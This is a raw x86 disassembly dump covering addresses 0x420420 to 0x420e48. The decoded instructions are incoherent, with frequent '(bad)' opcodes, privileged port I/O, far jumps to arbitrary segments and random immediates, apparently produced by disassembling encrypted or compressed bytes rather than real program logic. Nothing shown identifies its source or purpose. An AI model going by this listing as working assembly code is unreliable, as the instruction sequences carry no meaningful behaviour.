  420420:	xor    eax,0xd1eef347
  420425:	loop   0x42044b
  420427:	sub    eax,0x28c1b07d
  42042c:	popf   
  42042d:	pop    ds
  42042e:	inc    esi
  42042f:	call   0x32ec04d2
  420434:	fwait
  420435:	cmc    
  420436:	add    edx,eax
  420438:	aas    
  420439:	push   ebx
  42043a:	inc    edx
  42043b:	mov    DWORD PTR [ecx+ebx*8-0x4b],ecx
  42043f:	sub    al,0x8a
  420441:	rcr    BYTE PTR [edx],1
  420443:	(bad)  
  420444:	xor    DWORD PTR [ebp-0x62],ebx
  420447:	test   ebx,esp
  420449:	xchg   ebx,eax
  42044a:	inc    edi
  42044b:	call   0xe145:0xd8c3d817
  420452:	xor    eax,0x7942113e
  420457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420458:	in     eax,0x52
  42045a:	in     eax,dx
  42045b:	and    DWORD PTR [eax],eax
  42045d:	mov    eax,0x697d4356
  420462:	or     eax,0xc2c66dd9
  420467:	xlat   BYTE PTR ds:[ebx]
  420468:	jne    0x420449
  42046a:	addr16 mov esp,0x8a9b6443
  420470:	mov    ecx,0x86153f66
  420475:	cmc    
  420476:	in     eax,dx
  420477:	inc    esp
  420478:	jno    0x420434
  42047a:	adc    bh,bl
  42047c:	jmp    0x759f3911
  420481:	mov    ?,WORD PTR [esi]
  420483:	sub    BYTE PTR [esi-0x1108d2a5],0xac
  42048a:	sub    eax,DWORD PTR [esi+0x11]
  42048d:	xor    esp,eax
  42048f:	imul   esi,DWORD PTR [edi],0x0
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	push   esp
  420501:	pop    ebx
  420502:	push   edx
  420503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420504:	jo     0x42055e
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0xb7000001
  42050d:	scas   eax,DWORD PTR es:[edi]
  42050e:	stc    
  42050f:	and    ebp,DWORD PTR [ecx+0x16e52214]
  420515:	xchg   DWORD PTR [eax],ecx
  420517:	(bad)  
  420518:	call   0x12df:0xef85e18
  42051f:	int3   
  420520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420521:	aas    
  420522:	inc    ebx
  420523:	outs   dx,BYTE PTR ds:[esi]
  420524:	and    ecx,DWORD PTR [eax]
  420526:	loope  0x4204ec
  420528:	or     edi,DWORD PTR [ebx+0x3]
  42052b:	inc    edi
  42052c:	data16 xor bh,bh
  42052f:	mov    DWORD PTR cs:[esi+edi*2-0x3967c441],eax
  420537:	xchg   esi,eax
  420538:	xchg   ebx,eax
  420539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42053a:	lods   al,BYTE PTR ds:[esi]
  42053b:	inc    esi
  42053c:	daa    
  42053d:	stc    
  42053e:	xchg   ecx,eax
  42053f:	stos   DWORD PTR es:[edi],eax
  420540:	pop    ebp
  420541:	pop    ebp
  420542:	sub    ch,BYTE PTR [eax-0x4558ea49]
  420548:	cli    
  420549:	or     WORD PTR [edx],cx
  42054c:	in     eax,0xef
  42054e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42054f:	popf   
  420550:	sub    cl,ch
  420552:	add    ebp,DWORD PTR [ecx]
  420554:	leave  
  420555:	test   dh,0x2f
  420558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420559:	sbb    dh,BYTE PTR [ebx]
  42055b:	inc    esi
  42055c:	jnp    0x42053a
  42055e:	sbb    al,0xc0
  420560:	xchg   ebx,eax
  420561:	dec    eax
  420562:	and    al,0x54
  420564:	mov    ch,0x56
  420566:	mov    ecx,DWORD PTR [esi]
  420568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420569:	xor    BYTE PTR [esp+eax*1+0x55],dh
  42056d:	mov    ds:0x3c3d6287,al
  420572:	ss shr edi,1
  420575:	add    al,0x39
  420577:	int3   
  420578:	or     eax,0xeada00da
  42057d:	cmp    BYTE PTR [edi-0x5c],ch
  420580:	fnsave [edi]
  420582:	pop    ss
  420583:	jle    0x420581
  420585:	xchg   ebp,eax
  420586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420587:	jnp    0x4205dc
  420589:	and    DWORD PTR [ebp+0x6b],edx
  42058c:	hlt    
  42058d:	clc    
  42058e:	sar    ebx,0xa5
  420591:	dec    edi
  420592:	cmp    dl,BYTE PTR [edi]
  420594:	shr    BYTE PTR [ecx],0xd4
  420597:	retf   0xedeb
  42059a:	out    dx,eax
  42059b:	mov    esp,0x45a0939d
  4205a0:	push   0xa1c021e3
  4205a5:	cs dec esp
  4205a7:	ds lock (bad) 
  4205aa:	dec    ecx
  4205ab:	mov    edi,0x37287302
  4205b0:	iret   
  4205b1:	push   DWORD PTR [eax]
  4205b3:	aad    0x41
  4205b5:	push   cs
  4205b6:	xchg   esp,eax
  4205b7:	stos   BYTE PTR es:[edi],al
  4205b8:	dec    esi
  4205ba:	dec    edi
  4205bb:	pop    edi
  4205bc:	mov    edx,DWORD PTR [ecx]
  4205be:	scas   eax,DWORD PTR es:[edi]
  4205bf:	pop    edx
  4205c0:	retf   0x64df
  4205c3:	fisub  DWORD PTR [eax]
  4205c5:	mov    al,0x57
  4205c7:	fcomi  st,st(2)
  4205c9:	mov    dl,0xbc
  4205cb:	pushf  
  4205cc:	xchg   esi,eax
  4205cd:	ror    bh,1
  4205cf:	fs hlt 
  4205d1:	xchg   ecx,eax
  4205d2:	sub    BYTE PTR [ebx-0x4d3c6225],0x96
  4205d9:	mov    dh,0xe1
  4205db:	iret   
  4205dc:	lock repnz scas eax,DWORD PTR es:[edi]
  4205df:	and    esi,DWORD PTR [edx]
  4205e1:	xchg   DWORD PTR [ecx+0x56ae60e2],ecx
  4205e7:	pop    ds
  4205e8:	stc    
  4205e9:	scas   al,BYTE PTR es:[edi]
  4205ea:	inc    ecx
  4205eb:	in     al,dx
  4205ec:	retf   0xf1bb
  4205ef:	dec    ecx
  4205f0:	enter  0x7f2c,0xfa
  4205f4:	adc    DWORD PTR [ecx+0x4ab5b25],esi
  4205fa:	sub    eax,0xb776055d
  4205ff:	ret    0xfd04
  420602:	ret    
  420603:	dec    ebp
  420604:	pop    edi
  420605:	aam    0x8f
  420607:	sub    ecx,DWORD PTR [esi-0x2f300435]
  42060d:	jle    0x4205d1
  42060f:	sbb    bh,dh
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	data16 or al,0x97
  420683:	clc    
  420684:	jne    0x4206df
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0xc000001
  42068d:	inc    edx
  42068e:	jae    0x420638
  420690:	or     eax,0xeb6ff552
  420695:	lahf   
  420696:	xchg   ecx,eax
  420697:	jp     0x4206c2
  420699:	xchg   edx,eax
  42069a:	push   edx
  42069b:	mov    edi,0x6ddd41e3
  4206a0:	cmp    BYTE PTR [ecx+0x7c86694b],dh
  4206a6:	pop    edi
  4206a7:	leave  
  4206a8:	cs out 0xa3,eax
  4206ab:	inc    ecx
  4206ac:	push   0x1ade50af
  4206b1:	mov    al,0xe0
  4206b3:	in     eax,dx
  4206b4:	jns    0x42070c
  4206b6:	xor    DWORD PTR [ecx-0x5c],ebp
  4206b9:	rol    bh,1
  4206bb:	xchg   ecx,eax
  4206bc:	lock or BYTE PTR [eax-0x45614a8c],bh
  4206c3:	clc    
  4206c4:	push   eax
  4206c5:	out    dx,al
  4206c6:	loop   0x4206aa
  4206c8:	fwait
  4206c9:	jb     0x420728
  4206cb:	pop    ecx
  4206cc:	push   ebp
  4206cd:	(bad)  
  4206ce:	adc    al,BYTE PTR [eax]
  4206d0:	outs   dx,BYTE PTR ds:[esi]
  4206d1:	and    cl,BYTE PTR [esi+0x4003c528]
  4206d7:	mov    al,0xfc
  4206d9:	adc    al,bh
  4206db:	jno    0x420711
  4206dd:	cs dec eax
  4206df:	aad    0x89
  4206e1:	fwait
  4206e2:	mov    edi,0x8c90a117
  4206e7:	push   ebx
  4206e8:	aaa    
  4206e9:	add    al,0x6e
  4206eb:	inc    ecx
  4206ec:	inc    edi
  4206ed:	push   cs
  4206ee:	jae    0x4206a2
  4206f0:	mov    eax,ds:0x312bc051
  4206f5:	cmp    al,0x11
  4206f7:	lea    esi,[ebx-0x71cea6c6]
  4206fd:	les    edi,FWORD PTR [eax]
  4206ff:	mov    ah,0xc0
  420701:	mov    al,0xb9
  420703:	in     eax,dx
  420704:	fimul  WORD PTR [eax]
  420706:	imul   ebx,edx,0xffffffaf
  420709:	or     al,0xee
  42070b:	sar    BYTE PTR [edx],1
  42070d:	dec    ebx
  42070e:	adc    al,0xe2
  420710:	mov    ebp,0xc068025c
  420715:	mov    ebp,0x5cbbf7d5
  42071a:	pop    edi
  42071b:	lods   al,BYTE PTR ds:[esi]
  42071c:	rol    DWORD PTR [eax],1
  42071e:	ror    DWORD PTR [esp+ecx*1-0x45],cl
  420722:	dec    esi
  420723:	add    eax,0xa22ac93e
  420728:	fld    QWORD PTR [ecx+0x2431d17a]
  42072e:	push   es
  42072f:	imul   DWORD PTR [esi]
  420731:	in     al,dx
  420732:	repz and BYTE PTR [esi],cl
  420735:	rcl    DWORD PTR [ebp-0x2d],0x22
  420739:	test   al,0x9c
  42073b:	sub    al,0x22
  42073d:	loopne 0x4206ee
  42073f:	adc    ch,BYTE PTR [eax-0x2a1440c3]
  420745:	sbb    eax,DWORD PTR [ebp+0x41a85d5]
  42074b:	ffree  st(0)
  42074d:	iret   
  42074e:	xor    edx,esp
  420750:	stos   DWORD PTR es:[edi],eax
  420751:	mov    esi,0x3043b55d
  420756:	jne    0x4207b5
  420758:	jg     0x42077c
  42075a:	adc    bl,BYTE PTR [ebx-0x2a03fc3a]
  420760:	xor    eax,0xadbf884c
  420765:	iret   
  420766:	loope  0x4207c6
  420768:	push   ebp
  420769:	iret   
  42076a:	(bad)  
  42076b:	jp     0x4207e4
  42076d:	std    
  42076e:	aaa    
  42076f:	das    
  420770:	loope  0x4207bc
  420772:	aas    
  420773:	mov    edx,0xc8817621
  420778:	stos   BYTE PTR es:[edi],al
  420779:	pop    edx
  42077a:	sbb    BYTE PTR [edi+0x20],0x1b
  42077e:	push   es
  42077f:	(bad)  
  420780:	push   ss
  420781:	lods   al,BYTE PTR ds:[esi]
  420782:	dec    ebx
  420783:	mov    DWORD PTR [ecx-0x4e],0xc414fa4f
  42078a:	gs cmp ch,ah
  42078d:	jle    0x4207cd
  42078f:	lods   al,BYTE PTR ds:[esi]
  420790:	imul   eax,DWORD PTR [eax],0x0
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	daa    
  420801:	sbb    ebx,ecx
  420803:	and    eax,0x15a7a
  420808:	add    eax,0x2000001
  42080d:	xchg   ebp,eax
  42080e:	inc    eax
  42080f:	ds inc ecx
  420811:	test   DWORD PTR [eax+0x1775b625],edx
  420817:	mov    al,0x2e
  420819:	ficom  DWORD PTR ds:0x44ac3631
  42081f:	cld    
  420820:	and    eax,0x26d8403a
  420825:	adc    dl,al
  420827:	sbb    DWORD PTR [edx-0x76],esi
  42082a:	into   
  42082b:	fnstsw WORD PTR [esi-0x216baee5]
  420831:	xchg   esi,eax
  420832:	cld    
  420833:	inc    edx
  420834:	shl    DWORD PTR [edi+0x74],0x7e
  420838:	xor    DWORD PTR [ebx-0x65],esi
  42083b:	dec    edi
  42083c:	sar    DWORD PTR [ebx+edi*1+0x643add01],0xed
  420844:	ja     0x4208c2
  420846:	icebp  
  420847:	mov    bl,0x5a
  420849:	cmp    bl,bl
  42084b:	repnz dec esi
  42084d:	out    dx,al
  42084e:	add    dl,dl
  420850:	(bad)  
  420851:	jno    0x4208ae
  420853:	cmp    eax,0xe7f16565
  420858:	inc    esi
  420859:	aad    0x4f
  42085b:	mov    edi,0xec111b05
  420860:	mul    DWORD PTR [ebx+0x68]
  420863:	out    0xe1,eax
  420865:	inc    ecx
  420866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420867:	(bad)  
  420869:	or     eax,0x6369e282
  42086e:	sbb    ah,dh
  420870:	mov    al,ds:0xd2725c50
  420875:	mov    esp,0x20985c1
  42087a:	pop    edi
  42087b:	leave  
  42087c:	pushf  
  42087d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42087e:	jl     0x4208f7
  420880:	jmp    0x238e:0x54699bf3
  420887:	hlt    
  420888:	mov    fs,WORD PTR [eax+0x21]
  42088b:	lahf   
  42088c:	cmp    DWORD PTR [esi+eax*2],esp
  42088f:	jne    0x4208ef
  420891:	mov    ecx,0xae5229ff
  420896:	dec    edx
  420897:	fldenv [ecx+ecx*4-0x139ceb3c]
  42089e:	mov    dl,0x5
  4208a0:	and    BYTE PTR [ebp+0x2a7ac79d],bl
  4208a6:	jnp    0x420850
  4208a8:	dec    esi
  4208a9:	adc    BYTE PTR [esi+0x2ba14b51],0xb0
  4208b0:	or     DWORD PTR [ebx+0x2b64f4e3],edi
  4208b6:	pop    ebp
  4208b7:	mov    dh,0x32
  4208b9:	scas   al,BYTE PTR es:[edi]
  4208ba:	outs   dx,BYTE PTR ds:[esi]
  4208bb:	xchg   ecx,eax
  4208bc:	jb     0x420897
  4208be:	jecxz  0x420899
  4208c0:	fcmovne st,st(7)
  4208c2:	cmp    ecx,DWORD PTR [ebp+0x38]
  4208c5:	cmp    DWORD PTR ds:[edx+0x27],ebp
  4208c9:	fldenv [ebp-0x45]
  4208cc:	pushf  
  4208cd:	fsubp  st(2),st
  4208cf:	(bad)  
  4208d0:	cs inc ebx
  4208d2:	or     al,0x1a
  4208d4:	in     al,dx
  4208d5:	hlt    
  4208d6:	pop    es
  4208d7:	pop    ds
  4208d8:	xchg   ebp,eax
  4208d9:	xchg   ebx,eax
  4208da:	stos   BYTE PTR es:[edi],al
  4208db:	call   0x6a22c054
  4208e0:	xor    al,0x51
  4208e2:	cmp    ah,ah
  4208e4:	jo     0x420867
  4208e6:	sub    ecx,esp
  4208e8:	in     al,0xa8
  4208ea:	mov    ds:0xd603a980,al
  4208ef:	jl     0x4208c9
  4208f1:	and    eax,0x26a40c9b
  4208f6:	pop    es
  4208f7:	dec    ebp
  4208f8:	ja     0x4208a1
  4208fa:	loop   0x420918
  4208fc:	jg     0x4208d3
  4208fe:	daa    
  4208ff:	mov    ds:0x4aeea8cd,al
  420904:	adc    dh,BYTE PTR [esi-0x1c]
  420907:	stc    
  420908:	lds    esp,FWORD PTR [ebx-0x47]
  42090b:	mov    dl,0x20
  42090d:	in     eax,0x52
  42090f:	and    al,al
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x84
  420981:	rol    BYTE PTR [ecx+0x15b7faa],cl
  420987:	add    BYTE PTR ds:0xa7000001,al
  42098d:	adc    bh,cl
  42098f:	dec    esi
  420990:	mov    WORD PTR [edx-0x4c203b94],ss
  420996:	mov    al,ds:0xbac80043
  42099b:	adc    esp,ebx
  42099d:	adc    eax,0x63ce215f
  4209a2:	push   ss
  4209a3:	dec    eax
  4209a4:	icebp  
  4209a5:	jne    0x4209d6
  4209a7:	and    al,0x8d
  4209a9:	out    0xec,eax
  4209ab:	test   BYTE PTR [eax+0x63],bl
  4209ae:	(bad)  
  4209af:	fucomi st,st(2)
  4209b1:	int    0x86
  4209b3:	(bad)  
  4209b4:	push   ecx
  4209b5:	sti    
  4209b6:	lea    esi,[edx-0x51]
  4209b9:	(bad)  
  4209ba:	push   ds
  4209bb:	mov    ebx,0xa6b202fe
  4209c0:	lods   eax,DWORD PTR ds:[esi]
  4209c1:	xlat   BYTE PTR ds:[ebx]
  4209c2:	add    eax,0xa09b3b8f
  4209c7:	mov    esi,0xb2932ce2
  4209cc:	and    al,0xfe
  4209ce:	xor    ah,cl
  4209d0:	adc    BYTE PTR ss:0x55db3a9,dh
  4209d7:	push   es
  4209d8:	rcl    BYTE PTR ds:0xeed77406,cl
  4209de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209e0:	ja     0x420a45
  4209e2:	or     BYTE PTR [eax],dh
  4209e4:	loope  0x4209a5
  4209e6:	js     0x4209ed
  4209e8:	adc    al,0xb2
  4209ea:	dec    edx
  4209eb:	sub    ecx,DWORD PTR [eax-0x13615ad0]
  4209f1:	pop    es
  4209f2:	mov    esi,0x8f9e867a
  4209f7:	adc    eax,0x5edb4308
  4209fc:	add    eax,edx
  4209fe:	ds mov edx,0x7a54558a
  420a04:	sub    eax,0x3ac96691
  420a09:	mov    ah,0x3a
  420a0b:	dec    ecx
  420a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a0e:	mov    cl,0x5f
  420a10:	pop    ebp
  420a11:	pop    edi
  420a12:	xor    eax,0x76b0fcd2
  420a17:	(bad)  
  420a18:	jg     0x420a65
  420a1a:	js     0x420a27
  420a1c:	call   0xf9eb:0xb47dfa1f
  420a23:	lds    ebx,FWORD PTR [ebx+ebx*1]
  420a26:	dec    eax
  420a27:	sbb    DWORD PTR [edi],ecx
  420a29:	inc    eax
  420a2a:	pop    ebx
  420a2b:	xchg   esi,eax
  420a2c:	lods   eax,DWORD PTR ds:[esi]
  420a2d:	lods   eax,DWORD PTR ds:[esi]
  420a2e:	inc    esi
  420a2f:	cwde   
  420a30:	lock pop eax
  420a32:	jmp    0x4fae52fe
  420a37:	adc    bl,cl
  420a39:	sbb    al,BYTE PTR [edx]
  420a3b:	inc    esp
  420a3c:	add    DWORD PTR [ecx+0x23],eax
  420a3f:	dec    edx
  420a40:	dec    esp
  420a41:	inc    eax
  420a42:	add    al,0x80
  420a44:	push   esi
  420a45:	ret    
  420a46:	jg     0x420aaa
  420a48:	cmp    edx,DWORD PTR ds:0xfafea05d
  420a4e:	pop    edi
  420a4f:	cwde   
  420a50:	shl    dl,0xcc
  420a53:	or     DWORD PTR [edx+edx*4-0x68bfd5f8],0xffffffe7
  420a5b:	add    esp,DWORD PTR [ebp+0x72dabb6]
  420a61:	cld    
  420a62:	mov    esp,0x55cbbace
  420a67:	outs   dx,DWORD PTR ds:[esi]
  420a68:	push   ebp
  420a69:	dec    ecx
  420a6a:	enter  0x6e0f,0xa1
  420a6e:	adc    al,0xbf
  420a70:	jns    0x420a42
  420a72:	(bad)  
  420a73:	dec    edi
  420a74:	jmp    0x7deb:0x3007ab24
  420a7b:	push   ss
  420a7c:	icebp  
  420a7d:	aaa    
  420a7e:	in     al,dx
  420a7f:	jno    0x420a49
  420a81:	mov    edx,0x7f559806
  420a86:	xchg   DWORD PTR [eax-0x5a008b8b],edx
  420a8c:	push   0xffffffc2
  420a8e:	(bad)  [ebx+0xdd]
	...
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	add    al,0xda
  420b02:	mov    edi,0x15c844f
  420b07:	add    BYTE PTR ds:0xb8000001,al
  420b0d:	push   edi
  420b0e:	lock mov edx,0x750f880a
  420b14:	mov    ch,0x1f
  420b16:	jo     0x420ab1
  420b18:	jmp    0x420ab7
  420b1a:	adc    eax,DWORD PTR [edi+0x3]
  420b1d:	cmp    BYTE PTR [eax],bh
  420b1f:	fisub  DWORD PTR [ebp+0x21]
  420b22:	and    ecx,DWORD PTR [ebp+0x58]
  420b25:	push   es
  420b26:	es stc 
  420b28:	clc    
  420b29:	jmp    0x20b93f46
  420b2e:	out    dx,eax
  420b2f:	jns    0x420ac6
  420b31:	jl     0x420b3e
  420b33:	jbe    0x420b26
  420b35:	jbe    0x420b77
  420b37:	push   ss
  420b38:	xor    eax,DWORD PTR [ecx-0x219d436e]
  420b3e:	cwde   
  420b3f:	out    0x13,al
  420b41:	out    0x6b,al
  420b43:	popf   
  420b44:	mov    eax,0xf9dcabaf
  420b49:	rcr    DWORD PTR [ecx-0xd],0xc0
  420b4d:	and    ebx,edi
  420b4f:	add    eax,0x62145b0c
  420b54:	mov    cl,0xde
  420b56:	xchg   ebx,eax
  420b57:	inc    edx
  420b58:	cdq    
  420b59:	mov    bl,0x69
  420b5b:	les    eax,FWORD PTR [eax]
  420b5d:	push   eax
  420b5e:	push   ecx
  420b5f:	arpl   WORD PTR [ebp-0x3540eb18],si
  420b65:	ficom  DWORD PTR [ebp+0x7a3c045d]
  420b6b:	shr    BYTE PTR ss:[ebx+0x73],0x11
  420b70:	or     al,0x5d
  420b72:	or     DWORD PTR [esi+ebp*1],ecx
  420b75:	pop    esp
  420b76:	sub    DWORD PTR [ecx],0x700c8e2a
  420b7c:	loop   0x420b25
  420b7e:	cli    
  420b7f:	inc    edx
  420b80:	mov    ds,WORD PTR [ebp+0x3]
  420b83:	add    esp,DWORD PTR [ebp-0x62]
  420b86:	(bad)  
  420b87:	sahf   
  420b88:	pop    ebx
  420b89:	imul   DWORD PTR [eax+0x3eba469]
  420b8f:	add    al,0xf0
  420b91:	adc    al,0x2b
  420b93:	lods   al,BYTE PTR ds:[esi]
  420b94:	stos   BYTE PTR es:[edi],al
  420b95:	mov    bl,0xac
  420b97:	mov    esp,0xa8e1007f
  420b9c:	add    eax,0xe315680b
  420ba1:	or     eax,DWORD PTR [edi+0x1]
  420ba4:	xor    DWORD PTR [ebx],ebx
  420ba6:	dec    esi
  420ba7:	shl    DWORD PTR [eax-0x15],0x10
  420bab:	ins    BYTE PTR es:[edi],dx
  420bac:	test   BYTE PTR [esi-0x3a56291a],bh
  420bb2:	jmp    0x8281:0x6098927e
  420bb9:	jge    0x420c16
  420bbb:	sbb    eax,0xcbe3ce1f
  420bc0:	sub    esi,ebp
  420bc2:	(bad)  
  420bc3:	jmp    DWORD PTR [eax-0x2b]
  420bc6:	sbb    eax,0x3b52b12b
  420bcb:	jmp    0xcfd87cbf
  420bd0:	push   esp
  420bd1:	or     dh,ch
  420bd3:	lahf   
  420bd4:	add    cl,BYTE PTR [ecx]
  420bd6:	mov    DWORD PTR [ebp-0x63],edx
  420bd9:	icebp  
  420bda:	gs ds stos DWORD PTR es:[edi],eax
  420bdd:	dec    eax
  420bde:	cmp    al,0xd4
  420be0:	dec    ebp
  420be1:	adc    bh,BYTE PTR [ecx-0x29]
  420be4:	xchg   ebp,eax
  420be5:	fstp   QWORD PTR [eax+0x28585c4a]
  420beb:	clc    
  420bec:	sub    ecx,DWORD PTR [esp+ebx*2]
  420bef:	(bad)  
  420bf0:	retf   0xbfb4
  420bf3:	(bad)  
  420bf4:	push   edi
  420bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bf6:	xlat   BYTE PTR ds:[ebx]
  420bf7:	sbb    DWORD PTR [ecx-0x7fb4325e],eax
  420bfd:	clc    
  420bfe:	ins    DWORD PTR es:[edi],dx
  420bff:	jg     0x420bea
  420c01:	pop    ebx
  420c02:	sub    eax,0x1ce29a93
  420c07:	imul   esi,ebx,0x74efdf15
  420c0d:	cmp    DWORD PTR [eax+eax*4+0x3],eax
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	add    bl,BYTE PTR [ebp+0x56]
  420c83:	dec    ebx
  420c84:	mov    DWORD PTR [ebp+0x1],ebx
  420c87:	add    BYTE PTR ds:0xc000001,al
  420c8d:	mov    ds:0xb32327ac,eax
  420c92:	out    0xa4,al
  420c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c95:	sub    DWORD PTR [edi],edx
  420c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c98:	dec    esp
  420c99:	cli    
  420c9a:	dec    esp
  420c9b:	out    dx,eax
  420c9c:	fstp   DWORD PTR [esi-0x59]
  420c9f:	out    0x10,eax
  420ca1:	mov    ch,0xac
  420ca3:	cli    
  420ca4:	aaa    
  420ca5:	or     DWORD PTR [edx],esi
  420ca7:	cwde   
  420ca8:	cmp    bl,BYTE PTR [ecx]
  420caa:	mov    dl,ah
  420cac:	pop    eax
  420cad:	sub    ch,BYTE PTR [edx-0x202034d8]
  420cb3:	pop    ss
  420cb4:	outs   dx,BYTE PTR ds:[esi]
  420cb5:	dec    esi
  420cb6:	(bad)  [ebx+ebx*4-0x35df5285]
  420cbd:	cmp    esi,DWORD PTR [ebx-0x4d]
  420cc0:	inc    ecx
  420cc1:	frstor [ebx]
  420cc3:	pop    es
  420cc4:	mov    eax,ds:0xef0c1c10
  420cc9:	push   edx
  420cca:	clc    
  420ccb:	jb     0x420cfd
  420ccd:	ds mov dh,0xaa
  420cd0:	jmp    0x363c:0x8930a575
  420cd7:	mov    eax,ds:0xfbdcc3ba
  420cdc:	ror    edx,1
  420cde:	rcr    ch,1
  420ce0:	mov    ds:0x337192a9,al
  420ce5:	xchg   ebp,eax
  420ce6:	push   edx
  420ce7:	fmul   DWORD PTR [ebx+0x19ee95d0]
  420ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cee:	mov    ebx,0xeff8f00
  420cf3:	stos   BYTE PTR es:[edi],al
  420cf4:	mov    ch,BYTE PTR [ecx]
  420cf6:	sbb    eax,0xfec427eb
  420cfb:	xchg   ecx,eax
  420cfc:	pop    ss
  420cfd:	jmp    0x2e6c:0xb4317718
  420d04:	inc    esp
  420d05:	push   edi
  420d06:	sbb    al,0x27
  420d08:	ror    BYTE PTR [esi-0x26d91797],0x8c
  420d0f:	sub    bl,BYTE PTR [esi-0x7d]
  420d12:	fnstenv [ecx-0x7e]
  420d15:	mov    esi,0x32c35ea9
  420d1a:	dec    ebp
  420d1b:	mov    bl,0xef
  420d1d:	cs mov eax,es:0xda224524
  420d24:	push   esp
  420d25:	mov    ds,WORD PTR [bx+di+0x7a]
  420d29:	mov    eax,0x588c2877
  420d2e:	dec    ebx
  420d2f:	sub    edx,DWORD PTR [ebp-0x63]
  420d32:	jne    0x420d25
  420d34:	cwde   
  420d35:	dec    edx
  420d36:	fwait
  420d37:	inc    edx
  420d38:	sbb    BYTE PTR [eax],cl
  420d3a:	fwait
  420d3b:	cmp    eax,0x5044f779
  420d40:	jb     0x420d93
  420d42:	xor    ch,BYTE PTR [ebx+0x6b3caea4]
  420d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d49:	xor    al,BYTE PTR [eax-0x77]
  420d4c:	(bad)  
  420d4d:	xor    al,bl
  420d4f:	not    BYTE PTR [ebp+0x991f970]
  420d55:	mov    esi,0x4ad9067b
  420d5a:	outs   dx,BYTE PTR ds:[esi]
  420d5b:	or     edx,ecx
  420d5d:	pop    edx
  420d5e:	jae    0x420d9a
  420d60:	and    al,0xc4
  420d62:	mov    eax,ds:0x2e127bed
  420d67:	retf   
  420d68:	(bad)  
  420d6a:	inc    ebx
  420d6b:	dec    edi
  420d6c:	lea    esp,[edx]
  420d6e:	mov    DWORD PTR [esp+ecx*4-0x16],0x7e19410e
  420d76:	fdivr  QWORD PTR [edi]
  420d78:	jbe    0x420d28
  420d7a:	int    0x49
  420d7c:	cmp    al,0x1e
  420d7e:	pop    ecx
  420d7f:	pop    es
  420d80:	hlt    
  420d81:	cwde   
  420d82:	cdq    
  420d83:	xchg   ecx,eax
  420d84:	mov    al,0x2c
  420d86:	and    eax,0xa389a238
  420d8b:	out    0x68,eax
  420d8d:	shl    bl,0xa7
  420d90:	jno    0x420d92
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xc13fd6c9
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x9f000001,al
  420e0d:	ins    BYTE PTR es:[edi],dx
  420e0e:	jae    0x420e71
  420e10:	sbb    BYTE PTR [edi+0x4c],dl
  420e13:	rcl    DWORD PTR [esi+0x7f],1
  420e16:	or     DWORD PTR [ecx],ebx
  420e18:	pop    edx
  420e19:	dec    esp
  420e1a:	imul   BYTE PTR [esp+edx*2]
  420e1d:	xlat   BYTE PTR ds:[ebx]
  420e1e:	xor    BYTE PTR [esi-0x45],dh
  420e21:	loopne 0x420e12
  420e23:	sbb    BYTE PTR [esp+eiz*8+0x69],cl
  420e27:	mov    edx,0x2967507
  420e2c:	sbb    al,0x90
  420e2e:	popa   
  420e2f:	add    ebx,DWORD PTR [edi]
  420e31:	(bad)  [eax-0x6d]
  420e34:	cdq    
  420e35:	add    edi,ebx
  420e37:	cli    
  420e38:	cs in  eax,0xa
  420e3b:	adc    BYTE PTR [eax-0x28],dh
  420e3e:	ret    0xacaf
  420e41:	or     BYTE PTR [ebx-0xe0d3313],0x7b
  420e48:	jb     0x420e36
